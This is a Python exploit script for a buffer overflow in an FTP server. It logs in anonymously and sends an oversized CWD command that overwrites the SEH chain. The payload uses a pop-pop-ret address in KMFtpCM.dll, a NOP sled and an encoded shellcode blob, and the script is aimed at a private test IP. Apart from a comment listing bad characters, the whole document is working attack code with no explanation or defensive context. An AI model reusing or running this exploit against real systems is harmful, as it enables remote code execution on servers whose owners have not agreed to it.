#!/usr/bin/env python
import struct
import socket
import sys
import time
from subprocess import Popen, PIPE

def connect(host,port,payload):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	print "[+] Connected"
	s.send("USER anonymous\r\n")
	print s.recv(1024);
	time.sleep(1)
	s.send("PASS anonymous\r\n")
	print s.recv(1024);
	time.sleep(1)
	s.send("CWD %s:\\\r\n" %(payload))
	print s.recv(1024)


def gen_pattern(num):
	o = Popen("/opt/metasploit/apps/pro/msf3/tools/pattern_create.rb %s"%num,shell=True,stdout=PIPE,stderr=PIPE)
	return o.stdout.read()

def p32(addr):
	return struct.pack("<I",addr)

# Bad Chars \x00\x01\x02\x20\x0a\x0d\x3b


shellcode = (
"\x31\xc9\x31\xd2\x31\xf6" # zero out ecx,edx,esi
"\xbd\xc6\x2b\x86\xa2\xd9\xc4\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x4f\x31\x6e\x14\x83\xc6\x04\x03\x6e\x10\x24\xde\x7a\x4a\x21"
"\x21\x83\x8b\x51\xab\x66\xba\x43\xcf\xe3\xef\x53\x9b\xa6\x03"
"\x18\xc9\x52\x97\x6c\xc6\x55\x10\xda\x30\x5b\xa1\xeb\xfc\x37"
"\x61\x6a\x81\x45\xb6\x4c\xb8\x85\xcb\x8d\xfd\xf8\x24\xdf\x56"
"\x76\x96\xcf\xd3\xca\x2b\xee\x33\x41\x13\x88\x36\x96\xe0\x22"
"\x38\xc7\x59\x39\x72\xff\xd2\x65\xa3\xfe\x37\x76\x9f\x49\x33"
"\x4c\x6b\x48\x95\x9d\x94\x7a\xd9\x71\xab\xb2\xd4\x88\xeb\x75"
"\x07\xff\x07\x86\xba\x07\xdc\xf4\x60\x82\xc1\x5f\xe2\x34\x22"
"\x61\x27\xa2\xa1\x6d\x8c\xa1\xee\x71\x13\x66\x85\x8e\x98\x89"
"\x4a\x07\xda\xad\x4e\x43\xb8\xcc\xd7\x29\x6f\xf1\x08\x95\xd0"
"\x57\x42\x34\x04\xe1\x09\x51\xe9\xdf\xb1\xa1\x65\x68\xc1\x93"
"\x2a\xc2\x4d\x98\xa3\xcc\x8a\xdf\x99\xa8\x05\x1e\x22\xc8\x0c"
"\xe5\x76\x98\x26\xcc\xf6\x73\xb7\xf1\x22\xd3\xe7\x5d\x9d\x93"
"\x57\x1e\x4d\x7b\xb2\x91\xb2\x9b\xbd\x7b\xc5\x9c\x2a\x44\x7e"
"\xda\x28\x2c\x7d\x1a\x2e\x16\x08\xfc\x5a\x78\x5d\x57\xf3\xe1"
"\xc4\x23\x62\xed\xd2\xa3\x07\x7c\xb9\x33\x41\x9d\x16\x64\x06"
"\x53\x6f\xe0\xba\xca\xd9\x16\x47\x8a\x22\x92\x9c\x6f\xac\x1b"
"\x50\xcb\x8a\x0b\xac\xd4\x96\x7f\x60\x83\x40\x29\xc6\x7d\x23"
"\x83\x90\xd2\xed\x43\x64\x19\x2e\x15\x69\x74\xd8\xf9\xd8\x21"
"\x9d\x06\xd4\xa5\x29\x7f\x08\x56\xd5\xaa\x88\x68\x27\x66\x05"
"\xfc\x9e\x13\x64\x60\x21\xce\xab\x9d\xa2\xfa\x53\x5a\xba\x8f"
"\x56\x26\x7c\x7c\x2b\x37\xe9\x82\x98\x38\x38"
)



junk  = "A"*1037
junk += "\x74\x08\x90\x90"  # nseh
junk += p32(0x1220401e)		# seh  PPR KMFtpCM.dll
junk += "\x90" * 16
junk += shellcode
junk += "\x90"*(2048-len(junk)- 24 -len(shellcode))

connect("192.168.248.132",21,junk)